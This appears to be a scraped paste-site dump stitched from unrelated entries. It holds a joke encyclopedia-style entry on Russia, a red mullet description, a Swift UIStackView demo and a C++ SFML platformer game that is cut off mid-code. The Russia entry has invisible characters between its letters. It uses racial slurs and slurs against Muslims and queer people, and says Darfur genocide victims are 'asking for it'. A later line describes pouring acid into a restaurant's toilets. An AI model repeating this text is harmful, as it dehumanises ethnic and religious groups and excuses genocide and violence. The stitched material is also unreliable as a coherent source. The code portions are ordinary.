P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎6‎°‎
/‎5‎1‎°‎
2‎4‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎S‎u‎n‎t‎e‎r‎ ‎K‎l‎a‎u‎s‎.‎ 🎅🏻

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

R‎u‎s‎s‎i‎a‎
T‎h‎e‎ ‎K‎h‎a‎n‎a‎t‎e‎ ‎o‎f‎ ‎R‎u‎s‎s‎i‎a‎ ‎o‎r‎ ‎T‎s‎a‎r‎d‎o‎m‎ ‎o‎f‎ ‎R‎u‎s‎s‎i‎a‎ ‎i‎s‎ ‎t‎h‎e‎ ‎o‎n‎l‎y‎ ‎r‎e‎l‎e‎v‎a‎n‎t‎ ‎S‎l‎a‎v‎i‎c‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎i‎n‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎.‎ ‎I‎t‎ ‎w‎a‎s‎ ‎f‎o‎r‎m‎e‎r‎l‎y‎ ‎a‎ ‎g‎r‎e‎a‎t‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎r‎e‎i‎g‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎S‎o‎v‎i‎e‎t‎ ‎U‎n‎i‎o‎n‎.‎ ‎I‎t‎'‎s‎ ‎c‎a‎p‎i‎t‎a‎l‎ ‎i‎s‎ ‎a‎p‎t‎l‎y‎ ‎n‎a‎m‎e‎d‎ ‎M‎o‎s‎q‎u‎e‎-‎C‎o‎w‎ ‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎t‎h‎e‎ ‎b‎a‎s‎e‎ ‎o‎f‎ ‎o‎p‎e‎r‎a‎t‎i‎o‎n‎s‎ ‎f‎o‎r‎ ‎Q‎u‎e‎e‎r‎ ‎M‎u‎s‎l‎i‎m‎ ‎G‎r‎e‎m‎l‎i‎n‎s‎ ‎t‎h‎a‎t‎ ‎d‎w‎e‎l‎l‎ ‎w‎i‎t‎h‎i‎n‎ ‎f‎o‎r‎t‎r‎e‎s‎s‎ ‎K‎r‎e‎m‎l‎i‎n‎.‎ ‎M‎o‎t‎h‎e‎r‎ ‎R‎u‎s‎s‎i‎a‎ ‎i‎s‎ ‎i‎n‎h‎a‎b‎i‎t‎e‎d‎ ‎b‎y‎ ‎C‎o‎m‎m‎u‎n‎i‎s‎t‎ ‎b‎e‎a‎r‎-‎f‎i‎g‎h‎t‎i‎n‎g‎ ‎d‎r‎u‎n‎k‎s‎ ‎w‎i‎t‎h‎ ‎K‎a‎l‎a‎s‎h‎n‎i‎k‎o‎v‎s‎ ‎f‎o‎r‎ ‎d‎i‎c‎k‎s‎ ‎a‎n‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎p‎a‎s‎t‎ ‎f‎o‎r‎ ‎m‎o‎s‎t‎l‎y‎ ‎m‎e‎d‎i‎o‎c‎r‎e‎-‎l‎o‎o‎k‎i‎n‎g‎ ‎o‎r‎ ‎e‎v‎e‎n‎ ‎u‎g‎l‎y‎ ‎m‎a‎i‎l‎-‎o‎r‎d‎e‎r‎ ‎b‎r‎i‎d‎e‎s‎ ‎(‎n‎o‎w‎ ‎t‎h‎e‎y‎ ‎c‎a‎m‎e‎ ‎f‎r‎o‎m‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎a‎n‎d‎ ‎M‎o‎l‎d‎o‎v‎a‎)‎.‎ ‎N‎o‎w‎ ‎R‎u‎s‎s‎i‎a‎ ‎i‎s‎ ‎l‎i‎k‎e‎ ‎i‎t‎s‎ ‎f‎o‎r‎m‎e‎r‎ ‎e‎n‎e‎m‎y‎ ‎t‎h‎e‎ ‎U‎S‎A‎,‎ ‎a‎n‎ ‎u‎l‎t‎r‎a‎-‎c‎a‎p‎i‎t‎a‎l‎i‎s‎t‎ ‎p‎s‎e‎u‎d‎o‎d‎e‎m‎o‎c‎r‎a‎c‎y‎,‎ ‎t‎h‎e‎ ‎i‎n‎h‎a‎b‎i‎t‎a‎n‎t‎s‎ ‎a‎r‎e‎ ‎w‎i‎d‎e‎l‎y‎ ‎c‎o‎n‎s‎i‎d‎e‎r‎e‎d‎ ‎E‎u‎r‎o‎-‎n‎i‎g‎g‎e‎r‎s‎.‎ ‎A‎s‎ ‎p‎a‎r‎t‎ ‎o‎f‎ ‎t‎h‎e‎i‎r‎ ‎p‎r‎i‎m‎i‎t‎i‎v‎e‎ ‎v‎o‎d‎k‎a‎-‎n‎i‎g‎g‎e‎r‎ ‎n‎a‎t‎u‎r‎e‎,‎ ‎t‎h‎e‎y‎ ‎o‎f‎t‎e‎n‎ ‎a‎t‎t‎a‎c‎k‎ ‎o‎t‎h‎e‎r‎ ‎c‎o‎u‎n‎t‎r‎i‎e‎s‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎l‎u‎l‎z‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎a‎t‎'‎s‎ ‎w‎h‎a‎t‎ ‎f‎r‎e‎e‎d‎o‎m‎ ‎i‎s‎ ‎a‎l‎l‎ ‎a‎b‎o‎u‎t‎.‎ ‎A‎l‎s‎o‎,‎ ‎R‎u‎s‎s‎i‎a‎ ‎r‎e‎c‎e‎n‎t‎l‎y‎ ‎h‎a‎s‎ ‎b‎e‎c‎o‎m‎e‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎t‎h‎a‎t‎ ‎o‎f‎f‎i‎c‎i‎a‎l‎l‎y‎ ‎s‎u‎p‎p‎o‎r‎t‎s‎ ‎t‎h‎e‎ ‎D‎a‎r‎f‎u‎r‎ ‎g‎e‎n‎o‎c‎i‎d‎e‎,‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎o‎f‎ ‎F‎u‎r‎,‎ ‎M‎a‎s‎a‎l‎i‎t‎,‎ ‎a‎n‎d‎ ‎Z‎a‎g‎h‎a‎w‎a‎ ‎l‎i‎k‎e‎ ‎t‎o‎ ‎r‎e‎f‎e‎r‎ ‎t‎o‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎a‎s‎ ‎""‎G‎o‎d‎'‎s‎ ‎c‎h‎o‎s‎e‎n‎ ‎p‎e‎o‎p‎l‎e‎""‎.‎.‎.‎ ‎a‎n‎d‎ ‎w‎h‎e‎n‎ ‎y‎o‎u‎ ‎d‎o‎ ‎s‎o‎,‎ ‎y‎o‎u‎'‎r‎e‎ ‎b‎a‎s‎i‎c‎a‎l‎l‎y‎ ‎a‎s‎k‎i‎n‎g‎ ‎f‎o‎r‎ ‎i‎t‎.‎

(‎(‎ ‎B‎R‎B‎,‎ ‎C‎u‎r‎r‎e‎n‎t‎l‎y‎ ‎R‎e‎c‎l‎a‎i‎m‎i‎n‎g‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

M‎u‎l‎l‎u‎s‎ ‎b‎a‎r‎b‎a‎t‎u‎s‎,‎ ‎c‎o‎m‎m‎o‎n‎l‎y‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎r‎e‎d‎ ‎m‎u‎l‎l‎e‎t‎,‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎g‎o‎a‎t‎f‎i‎s‎h‎ ‎f‎o‎u‎n‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎M‎e‎d‎i‎t‎e‎r‎r‎a‎n‎e‎a‎n‎ ‎S‎e‎a‎,‎ ‎t‎h‎e‎ ‎B‎l‎a‎c‎k‎ ‎S‎e‎a‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎n‎o‎r‎t‎h‎e‎a‎s‎t‎e‎r‎n‎ ‎a‎n‎d‎ ‎c‎e‎n‎t‎r‎a‎l‎ ‎e‎a‎s‎t‎e‎r‎n‎ ‎A‎t‎l‎a‎n‎t‎i‎c‎ ‎O‎c‎e‎a‎n‎,‎ ‎w‎h‎e‎r‎e‎ ‎i‎t‎s‎ ‎r‎a‎n‎g‎e‎ ‎e‎x‎t‎e‎n‎d‎s‎ ‎f‎r‎o‎m‎ ‎S‎c‎a‎n‎d‎i‎n‎a‎v‎i‎a‎ ‎s‎o‎u‎t‎h‎w‎a‎r‎d‎s‎ ‎t‎o‎ ‎S‎e‎n‎e‎g‎a‎l‎,‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎C‎a‎n‎a‎r‎y‎ ‎I‎s‎l‎a‎n‎d‎s‎,‎ ‎A‎z‎o‎r‎e‎s‎ ‎a‎n‎d‎ ‎M‎a‎d‎e‎i‎r‎a‎.‎ ‎I‎t‎ ‎i‎s‎ ‎a‎ ‎d‎e‎m‎e‎r‎s‎a‎l‎ ‎f‎i‎s‎h‎ ‎a‎n‎d‎ ‎o‎c‎c‎u‎r‎s‎ ‎a‎t‎ ‎d‎e‎p‎t‎h‎s‎ ‎r‎a‎n‎g‎i‎n‎g‎ ‎f‎r‎o‎m‎ ‎1‎0‎ ‎t‎o‎ ‎3‎2‎8‎ ‎m‎ ‎(‎3‎0‎ ‎t‎o‎ ‎1‎,‎0‎0‎0‎ ‎f‎t‎)‎ ‎o‎v‎e‎r‎ ‎m‎u‎d‎d‎y‎,‎ ‎s‎a‎n‎d‎y‎ ‎o‎r‎ ‎g‎r‎a‎v‎e‎l‎ ‎b‎o‎t‎t‎o‎m‎s‎.‎ ‎I‎t‎ ‎c‎a‎n‎ ‎g‎r‎o‎w‎ ‎t‎o‎ ‎a‎ ‎s‎t‎a‎n‎d‎a‎r‎d‎ ‎l‎e‎n‎g‎t‎h‎ ‎o‎f‎ ‎3‎0‎ ‎c‎m‎ ‎(‎1‎2‎ ‎i‎n‎)‎,‎ ‎b‎u‎t‎ ‎i‎t‎ ‎i‎s‎ ‎m‎o‎r‎e‎ ‎c‎o‎m‎m‎o‎n‎l‎y‎ ‎a‎r‎o‎u‎n‎d‎ ‎1‎5‎ ‎c‎m‎ ‎(‎6‎ ‎i‎n‎)‎ ‎l‎o‎n‎g‎.‎ ‎I‎t‎s‎ ‎s‎n‎o‎u‎t‎ ‎i‎s‎ ‎s‎h‎o‎r‎t‎ ‎a‎n‎d‎ ‎s‎t‎e‎e‎p‎ ‎a‎n‎d‎ ‎t‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎n‎o‎ ‎s‎p‎i‎n‎e‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎o‎p‎e‎r‎c‎u‎l‎u‎m‎.‎ ‎T‎h‎e‎ ‎u‎p‎p‎e‎r‎ ‎j‎a‎w‎ ‎i‎s‎ ‎t‎o‎o‎t‎h‎l‎e‎s‎s‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎t‎e‎e‎t‎h‎ ‎o‎n‎ ‎t‎h‎e‎ ‎r‎o‎o‎f‎ ‎o‎f‎ ‎t‎h‎e‎ ‎m‎o‎u‎t‎h‎ ‎a‎n‎d‎ ‎o‎n‎ ‎t‎h‎e‎ ‎l‎o‎w‎e‎r‎ ‎j‎a‎w‎.‎ ‎A‎ ‎p‎a‎i‎r‎ ‎o‎f‎ ‎m‎o‎d‎e‎r‎a‎t‎e‎l‎y‎ ‎l‎o‎n‎g‎ ‎b‎a‎r‎b‎e‎l‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎c‎h‎i‎n‎ ‎d‎o‎ ‎n‎o‎t‎ ‎e‎x‎c‎e‎e‎d‎ ‎t‎h‎e‎ ‎p‎e‎c‎t‎o‎r‎a‎l‎ ‎f‎i‎n‎s‎ ‎i‎n‎ ‎l‎e‎n‎g‎t‎h‎.‎ ‎T‎h‎i‎s‎ ‎f‎i‎s‎h‎ ‎i‎s‎ ‎r‎o‎s‎e‎-‎p‎i‎n‎k‎,‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎d‎i‎s‎t‎i‎n‎c‎t‎i‎v‎e‎ ‎m‎a‎r‎k‎i‎n‎g‎s‎ ‎o‎n‎ ‎i‎t‎s‎ ‎f‎i‎n‎s‎.‎ ‎T‎h‎i‎s‎ ‎M‎.‎ ‎b‎a‎r‎b‎a‎t‎u‎s‎ ‎i‎n‎d‎i‎v‎i‎d‎u‎a‎l‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎A‎r‎r‎á‎b‎i‎d‎a‎ ‎N‎a‎t‎u‎r‎a‎l‎ ‎P‎a‎r‎k‎,‎ ‎P‎o‎r‎t‎u‎g‎a‎l‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎D‎i‎e‎g‎o‎ ‎D‎e‎l‎s‎o‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎t‎o‎ ‎A‎r‎b‎y‎'‎s‎ ‎a‎n‎d‎ ‎g‎e‎t‎ ‎r‎e‎v‎e‎n‎g‎e‎ ‎o‎n‎ ‎t‎h‎o‎s‎e‎ ‎a‎s‎s‎h‎o‎l‎e‎s‎ ‎f‎o‎r‎ ‎g‎i‎v‎i‎n‎g‎ ‎m‎e‎ ‎d‎i‎a‎r‎r‎h‎e‎a‎ ‎s‎o‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎f‎i‎l‎l‎ ‎t‎h‎e‎i‎r‎ ‎t‎o‎i‎l‎e‎t‎s‎ ‎u‎p‎ ‎w‎i‎t‎h‎ ‎a‎c‎i‎d‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎s‎t‎e‎a‎l‎ ‎t‎h‎e‎i‎r‎ ‎s‎t‎u‎p‎i‎d‎ ‎g‎i‎a‎n‎t‎ ‎h‎a‎t‎ ‎l‎o‎g‎o‎ ‎a‎n‎d‎ ‎w‎e‎a‎r‎ ‎i‎t‎.‎"
aEKaAQuS,Untitled,Don_Mag,Swift,Sunday 3rd of December 2023 08:26:06 AM CDT,"
// UIStackView using .fillProportionally

class ProportionalStackVC: UIViewController {
	
	let proLeft: UILabel = {
		let v = UILabel()
		v.textAlignment = .left
		v.lineBreakMode = .byTruncatingTail
		v.backgroundColor = .cyan
		return v
	}()

	let proRight: UILabel = {
		let v = UILabel()
		v.textAlignment = .right
		v.lineBreakMode = .byTruncatingHead
		v.backgroundColor = .yellow
		return v
	}()

	let sampleStrings: [[String]] = [
		[""My text is less than half."", ""Less than half.""],
		[""Less than half."", ""My text is less than half.""],
		[""This text is a bit wider than half."", ""Less than half.""],
		[""Less than half."", ""This text is a bit wider than half.""],
		[""This text is considerably wider than half."", ""Less than half.""],
		[""Less than half."", ""This text is considerably wider than half.""],
		[""This text is considerably wider than half."", ""Text still Less than half.""],
		[""Text still Less than half."", ""This text is considerably wider than half.""],
		[""The Left Label is considerably wider than half."", ""Right Label is wider than half.""],
		[""Left Label is wider than half."", ""The Right Label is considerably wider than half.""],
		[""This text is just about but not quite full width."", ""Short.""],
		[""Short."", ""This text is just about but not quite full width.""],
	]

	var idx: Int = 0
	
	override func viewDidLoad() {
		super.viewDidLoad()
		
		let stackView = UIStackView()
		stackView.distribution = .fillProportionally
		stackView.spacing = 10
		
		stackView.addArrangedSubview(proLeft)
		stackView.addArrangedSubview(proRight)

		stackView.translatesAutoresizingMaskIntoConstraints = false
		view.addSubview(stackView)
		
		let g = view.safeAreaLayoutGuide
		NSLayoutConstraint.activate([
			stackView.topAnchor.constraint(equalTo: g.topAnchor, constant: 40.0),
			stackView.leadingAnchor.constraint(equalTo: g.leadingAnchor, constant: 8.0),
			stackView.trailingAnchor.constraint(equalTo: g.trailingAnchor, constant: -8.0),
		])
		
		updateLabels()
	}
	
	override func touchesBegan(_ touches: Set<UITouch>, with event: UIEvent?) {
		updateLabels()
	}

	func updateLabels() {
		
		let p = sampleStrings[idx % sampleStrings.count]
		
		proLeft.text = p[0]
		proRight.text = p[1]

		idx += 1
		if idx == sampleStrings.count {
			idx = 0
		}
		
	}
	
}
"
39gkX5US,CourseWork,Dimaland,C++,Sunday 3rd of December 2023 07:44:03 AM CDT,"#include <SFML/Graphics.hpp>
#include <conio.h>

using namespace sf;

float offsetX = 0, offsetY = 0;

const int H = 18;
const int W = 66;

const int ts = 77;
const int vr = 60;

int lv = 1;

String TileMap[H] = {
""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"",
""A            A                         A                         A"",
""A            A                         A   A       A             A"",
""AAAAAAAAAAA  A   A       AAA        A  A  AAAAAAAAAAAAAA      AAAA"",
""A            A  AAAAAAAAAAAAAAAAAAAAA  A            A            A"",
""A            AA           A            AAAAAAAAAA   A            A"",
""A    A  A    A            A            A            AAAA      AAAA"",
""A  AAAAAAAAAAAAAAAAAAAAA  A A         AA           AA            A"",
""A            A           AA AAAAAAAAAAAA   A        A            A"",
""A            A            A            A  AAAXXAAXXAAAAA      AAAA"",
""AAAAAAAAAAX  AA  AA A A A A            A            A            A"",
""A            A    A       A   X  X  X  AA           A            A"",
""A            A    A       AAAAAAAAAAA  A       A    AAAA      AAAA"",
""A  A        AA   AA       A            AAAAAAAAAA   A            A"",
""A  AAAAAAAAAAAA   A       A            A            A            A"",
""A                 A       A                        AAAAA      AAAA"",
""A                AAXXXXXXXA         A    A          AAAAXXXXXXAAAA"",
""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"",
};

bool play = false, menu = true, game = false, puskgame = false, pob = false, die = false, pause = false;

class setMenu {
public:
	bool pusklever[5], blv[5];

	setMenu() {
		for (int i = 0; i < 5; i++)
			pusklever[i] = false;

		blv[0] = true;
		for (int i = 1; i < 5; i++)
			blv[i] = false;
	}
};

class Player {
public:
	float dx, dy;
	FloatRect rect;
	bool onGround, rig;
	Sprite sprite;
	float curFrame, damFrame;
	int l, blockdam;
	bool life, damage;

	Player(Texture& image) {
		sprite.setTexture(image);
		rect = FloatRect(ts, ts * 2, 77 * 0.9, 65 * 0.9);
		sprite.setTextureRect(IntRect(0, 0, 77, 65));
		sprite.setScale(0.9, 0.9);
		dx = dy = 0;
		curFrame = 0;
		l = 3;
		life = true;
		damage = false;
		damFrame = 0;
		blockdam = 0;
	}

	void update(float time) {
		rect.left += dx * time;
		Collision(0);

		if (!onGround)
			dy = dy + 0.0005 * time;

		rect.top += dy * time;
		onGround = false;
		Collision(1);

		if (l <= 0) {
			life = false;

			play = false;
			die = true;
		}

		if (pob)
			sprite.setTextureRect(IntRect(0, 0, 77, 65));

		curFrame += 0.01 * time;
		if (curFrame > 8)
			curFrame -= 7;

		if (dx > 0) {
			if (dy == 0)
				sprite.setTextureRect(IntRect(77 * int(curFrame), 0, 77, 65));
			else
				sprite.setTextureRect(IntRect(0, 81, 45, 65));

			rig = true;
		}
		if (dx < 0) {
			if (dy == 0)
				sprite.setTextureRect(IntRect(77 * int(curFrame) + 77, 0, -77, 65));
			else
				sprite.setTextureRect(IntRect(45, 81, -45, 65));

			rig = false;
		}

		sprite.setPosition(rect.left - offsetX, rect.top - offsetY);

		dx = 0;
	}

	void Collision(int dir) {
		for (int i = rect.top / ts; i < (rect.top + rect.height) / ts; i++)
			for (int j = rect.left / ts; j < (rect.left + rect.width) / ts; j++) {
				if (TileMap[i][j] == 'A' || TileMap[i][j] == 'K') {
					if (dx > 0 && dir == 0)
						rect.left = j * ts - rect.width;
					if (dx < 0 && dir == 0)
						rect.left = j * ts + ts;
					if (dy > 0 && dir == 1) {
						rect.top = i * ts - rect.height;
						dy = 0;
						onGround = true;
					}
					if (dy < 0 && dir == 1) {
						rect.top = i * ts + ts;
						dy = 0;
					}
				}

				if (TileMap[i][j] == 'B')
					TileMap[i][j] = ' ';

				if (TileMap[i][j] == 'C') {
					TileMap[i][j] = ' ';

					l++;
				}

				if (TileMap[i][j] == '2' || TileMap[i][j] == '3' ||
					TileMap[i][j] == '4' || TileMap[i][j] == '5') {
					rect.left += ts + ts;

					for (int z = 0; z < H; z++)
						TileMap[z][j] = 'A';

					pob = true;
					play = false;
				}

				if (TileMap[i][j] == 'X' && !damage) {
					if ((dx > 0 && dir == 0) || (dx < 0 && dir == 0) ||
						(dy > 0 && dir == 1) || (dy < 0 && dir == 1)) {
						l--;
						damage = true;

						if (l > 0) {
							if (i == 10 && j == 10) {
								if (dy < 0 && dir == 1)
									blockdam = 1;

								else if (dy > 0 && dir == 1)
									blockdam = 2;
							}

							if (i == 16 && j >= 19 && j <= 25)
								blockdam = 3;

							if (i == 11 && (j == 30 || j == 33 || j == 36))
								blockdam = 4;

							if (i == 9 && (j == 45 || j == 46 || j == 49 || j == 50)) {
								if (dy < 0 && dir == 1)
									blockdam = 5;

								else if (dy > 0 && dir == 1)
									blockdam = 6;
							}

							if (i == 16 && j >= 56 && j <= 61)
								blockdam = 7;
						}
					}
				}
			}
	}
};

class Pula {
public:
	float dx, dy;
	FloatRect rect;
	int go;
	Sprite sprite;

	Pula(Texture& image) {
		sprite.setTexture(image);
		dx = dy = 0;
		go = 0;
	}

	void update(float time) {
		rect.left += dx * time;
		Collision(0);

		rect.top += dy * time;
		Collision(1);

		sprite.setPosition(rect.left - offsetX, rect.top - offsetY);
	}

	void Collision(int dir) {
		for (int i = rect.top / ts; i < (rect.top + rect.height) / ts; i++)
			for (int j = rect.left / ts; j < (rect.left + rect.width) / ts; j++)
				if (TileMap[i][j] == 'A')
					if ((dx > 0 && dir == 0) || (dx < 0 && dir == 0))
						go = 0;
	}
};

class Enemy {
public:
	float dx, dy;
	FloatRect rect;
	Sprite sprite;
	float curFrame;
	bool life;

	void set(Texture& image, int x, int y) {
		sprite.setTexture(image);
		sprite.setScale(0.38, 0.38);
		rect = FloatRect(x, y, ts, ts);

		dx = 0.1;
		curFrame = 0;
		life = false;
	}

	void update(float time) {
		if (!pause)
			rect.left += dx * time;

		Collision();

		curFrame += time * 0.005;
		if (curFrame > 5)
			curFrame -= 5;

		if (life) {
			if (dx > 0)
				sprite.setTextureRect(IntRect(165 * int(curFrame), 0, 165, 204));
			else if (dx < 0)
				sprite.setTextureRect(IntRect(165 * int(curFrame) + 165, 0, -165, 204));
		}
		else
			sprite.setTextureRect(IntRect(0, 0, 0, 0));

		sprite.setPosition(rect.left - offsetX, rect.top - offsetY);
	}

	void Collision() {
		for (int i = rect.top / ts; i < (rect.top + rect.height) / ts; i++)
			for (int j = rect.left / ts; j < (rect.left + rect.width) / ts; j++)
				if (TileMap[i][j] == 'A') {
					if (dx > 0) {
						rect.left = j * ts - rect.width;
						dx *= -1;
					}
					else if (dx < 0) {
						rect.left = j * ts + ts;
						dx *= -1;
					}
				}
	}
};

class Boss {
public:
	float dx, dy;
	FloatRect rect;
	Sprite sprite;
	float curFrame;
	bool life, rig;
	int l;

	void set(Texture& image, int x, int y) {
		sprite.setTexture(image);
		sprite.setScale(1.5, 1.5);
		rect = FloatRect(x, y, ts, ts);

		dy = 0.2;
		curFrame = 0;
		life = true;
		rig = false;
		l = 10;
	}

	void update(float time) {
		if (!pause)
			rect.top += dy * time;

		Collision();

		if (life && l == 0) {
			life = false;

			sprite.setTextureRect(IntRect(0, 0, 0, 0));

			pob = true;
			play = false;
		}

		sprite.setPosition(rect.left - offsetX, rect.top - offsetY);
	}

	void Collision() {
		for (int i = rect.top / ts; i < (rect.top + rect.height) / ts; i++)
			for (int j = rect.left / ts; j < (rect.left + rect.width) / ts; j++)
				if (TileMap[i][j] == 'A')
				{
					if (dy > 0) {
						rect.top = i * ts - rect.height;
						dy *= -1;
					}
					else if (dy < 0) {
						rect.top = i * ts + ts;
						dy *= -1;
					}
				}
	}
};

class PulaBoss {
public:
	float dx, dy;
	FloatRect rect;
	int go;
	Sprite sprite;

	void set(Texture& image, int x, int y) {
		sprite.setTexture(image);
		dx = dy = 0;
		go = 0;
	}

	void update(float time) {
		if (!pause)
			rect.left += dx * time;
		Collision();

		if (!pause)
			rect.top += dy * time;

		sprite.setPosition(rect.left - offsetX, rect.top - offsetY);
	}

	void Collision() {
		for (int i = rect.top / ts; i < (rect.top + rect.height) / ts; i++)
			for (int j = rect.left / ts; j < (rect.left + rect.width) / ts; j++)
				if (TileMap[i][j] == 'A') {
					if (dx > 0) {
						rect.left = j * ts - rect.width;
						go = 0;
					}
					else if (dx < 0) {
						rect.left = j * ts + ts;
						go = 0;
					}
				}
	}
};

int main() {
	RenderWindow window(VideoMode(1000, 500), ""Platformer Cosmos!"");

	Texture f;
	f.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Play/fon.png"");
	Sprite fon(f);

	Texture Picture;
	Picture.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Play/man.png"");
	Player p(Picture);
	int frame = 0;

	Texture t2;
	t2.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Play/plat.png"");
	Sprite plat(t2);

	Texture t1;
	t1.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Play/pula.png"");
	Pula pu(t1);

	Texture tl;
	tl.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Play/life.png"");
	Sprite life[12];
	for (int i = 0; i < 12; i++) {
		life[i].setTexture(tl);
		life[i].setScale(1.5, 1.5);
		life[i].setPosition(5 + 50 * i, 5);
	}

	Texture t3;
	t3.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Play/enemy.png"");
	Enemy enemy[vr];
	enemy[0].set(t3, 4 * ts, 13 * ts);
	for (int i = 1; i < 4; i++)
		enemy[i].set(t3, (18 + (i - 1)) * ts, 3 * ts);
	for (int i = 4; i < 9; i++)
		enemy[i].set(t3, (28 + (i - 4)) * ts, 3 * ts);
	for (int i = 9; i < 16; i++)
		enemy[i].set(t3, (29 + (i - 9)) * ts, 7 * ts);
	for (int i = 16; i < 26; i++)
		enemy[i].set(t3, (27 + (i - 16)) * ts, 16 * ts);
	for (int i = 26; i < 36; i++)
		enemy[i].set(t3, (42 + (i - 26)) * ts, 16 * ts);
	for (int i = 36; i < 44; i++)
		enemy[i].set(t3, (40 + (i - 36)) * ts, 12 * ts);
	for (int i = 44; i < 53; i++)
		enemy[i].set(t3, (44 + (i - 44)) * ts, 8 * ts);
	for (int i = 53; i < 60; i++)
		enemy[i].set(t3, (44 + (i - 53)) * ts, 2 * ts);

	int enemydam = 0, bossdam = 0;

	Texture t4;
	t4.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Play/Boss.png"");
	Boss boss;
	boss.set(t4, 59 * ts, ts);

	Texture t5;
	t5.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Play/pulaBoss.png"");
	PulaBoss puBos;
	puBos.set(t5, 59 * ts, ts);

	Sprite lifeBoss[10];
	for (int i = 0; i < 10; i++) {
		lifeBoss[i].setTexture(t4);
		lifeBoss[i].setScale(0.5, 0.5);
		lifeBoss[i].setPosition(60 * i, 60);
	}

	Texture nl;
	nl.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Play/nadlev.png"");
	Sprite nadlev(nl);
	nadlev.setPosition(700, 0);

	Texture sc;
	sc.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Play/score.png"");
	Sprite score(sc);
	score.setTextureRect(IntRect(0, 0, 27, 36));
	score.setPosition(950, 5);

	Texture m1;
	m1.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/naz.png"");
	Sprite naz(m1);
	naz.setPosition(200, 10);

	Texture m2;
	m2.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/butplay.png"");
	Sprite butplay(m2);
	butplay.setPosition(200, 235);

	Texture m3;
	m3.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/exit.png"");
	Sprite exit(m3);
	exit.setPosition(600, 235);

	Texture m4;
	m4.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/nazurav.png"");
	Sprite nazurav(m4);
	nazurav.setPosition(350, 10);

	Texture m5;
	m5.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/butlev.png"");
	Sprite butlev[5];
	for (int i = 0; i < 5; i++) {
		butlev[i].setTexture(m5);
		butlev[i].setPosition(150 + 150 * i, 230);
		butlev[i].setTextureRect(IntRect(0, 0, 80, 80));
	}
	butlev[0].setTextureRect(IntRect(0, 80, 80, 80));

	Texture m6;
	m6.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/back.png"");
	Sprite back(m6);
	back.setPosition(150, 400);

	setMenu sm;

	Texture m7;
